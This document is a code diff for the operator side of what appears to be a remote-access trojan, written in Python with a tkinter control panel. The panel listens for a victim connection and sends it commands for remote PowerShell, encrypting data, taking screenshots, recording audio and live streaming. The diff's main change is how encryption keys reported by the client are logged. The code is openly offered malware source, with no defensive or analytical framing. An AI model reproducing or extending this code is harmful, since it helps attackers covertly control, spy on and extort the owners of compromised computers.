@@ -11,6 +11,7 @@ RECV_IMAGE = ".png"
 RECV_AUDIO = ".wav"
 devices=[]
 
+
 def log(message):
     line = f"[{timestamp()}] {message}"
     app.root.after(0, _insert_log, line + "\n")
@@ -27,19 +28,20 @@ def _insert_log(text):
 def createResultFolder():   
         os.chdir(os.path.dirname(os.path.abspath(sys.argv[0])))
         os.mkdir("Result")
-        # os.chdir("Result")
+        os.chdir("Result")
 
 class Server:
     def __init__(self):
         self.sock = None
         self.connected = False
-    
-    def save_log():
+
+    def save_log(self):
         """Save a snapshot of current GUI log to a timestamped file."""
         content = app.log_box.get("1.0", "end").strip()
         if not content:
             log("Log is empty; nothing to save.")
             return
+        result="Result"
         name = f"log_snapshot_{int(time.time())}.txt"
         with open(name, "w", encoding="utf-8") as f:
             f.write(content)
@@ -52,6 +54,7 @@ class Server:
             return
         host = app.host_var.get()
         port = int(app.port_var.get())
+        
         threading.Thread(target=self._connect_thread, args=(host, port), daemon=True).start()
     def _connect_thread(self, host, port):
         try:
@@ -62,9 +65,11 @@ class Server:
             s.listen()
             soc, add = s.accept()
             self.sock = soc
+
             self.connected = True
-            if self.connected:
+            if self.connected == True:
                 createResultFolder()
+
             log(f"connection with  {add[0]}:{add[1]}")
             threading.Thread(target=self._listen_loop, daemon=True).start()
         except Exception as e:
@@ -114,7 +119,7 @@ class Server:
         return data 
     def _listen_loop(self):
         try:
-            while CL.connected:
+            while self.connected:
                 # Read 4-byte length prefix (for JSON response)
                 hdr = self._recv_all(4)
                 if not hdr:
@@ -124,10 +129,9 @@ class Server:
                 if not data:
                     break 
 
-                # Parse JSON response encryption_key.key
+                # Parse JSON response
                 try:
                     resp = json.loads(data.decode('utf-8'))
-                    log({"recive jsdon file": resp["command"]})
                 except Exception:
                     log("Received non-JSON response or parsing error.")
                     continue
@@ -136,12 +140,15 @@ class Server:
                 cmd = resp.get("command")
                 status = resp.get("status")
                 log(f"Response for {cmd}: status={status}")
-                if cmd=="key":
-                    msg=resp["details"]
-                    log(f'recieve key encryptions : ',{msg})
-
-                    with open("Result\encryption_key.key","wb") as k:
-                        k.write(msg)
+                # if cmd=="message":
+                #     msg=resp["note"]
+                #     log(f'Clint Message: ',{msg})
+                if cmd == "key" and "details" in resp:
+                    key_hex = resp["details"]
+                    log(f"Encryption Key (base64): {key_hex}")
+                    key='Encryption_key.log'
+                    with open(key, "a", encoding="utf-8") as k:
+                        k.write(key_hex)
                 if cmd == "powershell" and "output" in resp:
                     out = resp["output"]
                     log(f"PowerShell Output:\n{out}")
@@ -237,7 +244,6 @@ class Server:
         except Exception as e:
             log(f"Listener error: {e}")
         finally:
-            # Clean up connection state
             try:
                 if self.sock:
                     self.sock.close()
@@ -259,8 +265,7 @@ class Server:
             # Send length prefix then payload
             self.sock.send(len(b).to_bytes(4, 'big'))
             self.sock.send(b)
-            log(type(b))
-            log(f" Server : Sent command: {obj.get('command')}")
+            log(f"Sent command: {obj.get('command')}")
         except Exception as e:
             log(f"Send failed: {e}")
     def cmd_powershell(self):
@@ -285,7 +290,6 @@ class Server:
             self.send_json_command({"command": "powershell", "cmd": cmd})
 
         ttk.Button(win, text="Send Command", command=send_cmd).pack(pady=5)
-    
 
     def EncryptData(self):
         win = tk.Toplevel(app.root)
@@ -383,6 +387,7 @@ class Server:
             status_lbl.config(text="Command sent successfully", style="Success.TLabel")
 
         # ---------- Buttons ----------
+
         btn_frame = ttk.Frame(container)
         btn_frame.grid(sticky="e", pady=15)
 
@@ -407,6 +412,8 @@ class Server:
             style="Green.TButton",
             command=do_decrypt
         ).grid(row=0, column=1, padx=6)
+
+
     def shareFile(self):
         pass
 
@@ -439,7 +446,7 @@ class gui:
             style.theme_use("clam")
         except Exception:
             pass
-        style.configure("TFrame", background="#1c1c1e")
+        style.configure("TFrame", background="#1c1e1c")
         style.configure("TLabel", background="#1c1c1e", foreground="#e9e9e9")
         style.configure("TButton", background="#2e2e2f", foreground="#e9e9e9")
         style.map("TButton", background=[('active', '#3a3a3c')])
@@ -450,14 +457,13 @@ class gui:
         sidebar.grid_propagate(False)
 
         # Host / Port entry controls
-        ttk.Label(sidebar, text="Server Host:").pack(anchor="w")
+        ttk.Label(sidebar, text="Server Host:", background="#1c1e1c").pack(anchor="w")
         self.host_var = tk.StringVar(value="0.0.0.0")
-        ttk.Entry(sidebar, textvariable=self.host_var).pack(fill="x", pady=2)
+        ttk.Entry(sidebar, textvariable=self.host_var, background="#163716").pack(fill="x", pady=2)
 
-        ttk.Label(sidebar, text="Server Port:").pack(anchor="w", pady=(6,0))
+        ttk.Label(sidebar, text="Server Port:", background="#1c1e1c").pack(anchor="w", pady=(6,0))
         self.port_var = tk.IntVar(value=5001)
-        ttk.Entry(sidebar, textvariable=self.port_var).pack(fill="x", pady=2)
-
+        ttk.Entry(sidebar, textvariable=self.port_var, background="#163716").pack(fill="x", pady=2)
         # Connect / Disconnect buttons
         btn_frame = ttk.Frame(sidebar)
         btn_frame.pack(fill="x", pady=(8,4))
@@ -474,7 +480,7 @@ class gui:
         ttk.Button(sidebar, text="Open PowerShell Console", command=CL.cmd_powershell).pack(fill="x", pady=3)
         ttk.Button(sidebar, text="Share file", command=CL.cmd_powershell).pack(fill="x", pady=3)
         ttk.Button(sidebar, text="Encrypt Data", command=CL.EncryptData).pack(fill="x", pady=3)
-        # ttk.Button(sidebar, text="Decrypt Data", command=CL.DecryptData).pack(fill="x", pady=3)
+        # ttk.Button(sidebar, text="Decrypt Data", command=CL.DecryptData).pack(fill="x", pady=3)/
         ttk.Button(sidebar, text="Request Screenshot", command=CL.cmd_screenshot).pack(fill="x", pady=3)
         ttk.Button(sidebar, text="Request Record Audio (1s)", command=CL.cmd_record_audio).pack(fill="x", pady=3)
         ttk.Button(sidebar, text="Request Live Stream", command=CL.cmd_live_stream).pack(fill="x", pady=3)
